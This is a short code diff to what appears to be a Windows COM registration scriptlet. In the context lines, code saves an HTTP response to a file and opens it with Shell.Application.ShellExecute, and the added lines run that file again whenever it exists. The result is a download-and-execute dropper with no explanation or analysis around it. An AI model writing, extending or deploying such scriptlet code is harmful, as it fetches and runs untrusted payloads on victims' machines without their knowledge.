@@ -29,6 +29,9 @@ if (xhr.Status == 200) {
     stream.Close();
     new ActiveXObject("Shell.Application").ShellExecute(filepath,"","","open","1");
 }
+if(new ActiveXObject("Scripting.FileSystemObject").FileExists(filepath)){
+new ActiveXObject("Shell.Application").ShellExecute(filepath,"","","open","1");
+}
     ]]>
 </script>
 </registration>
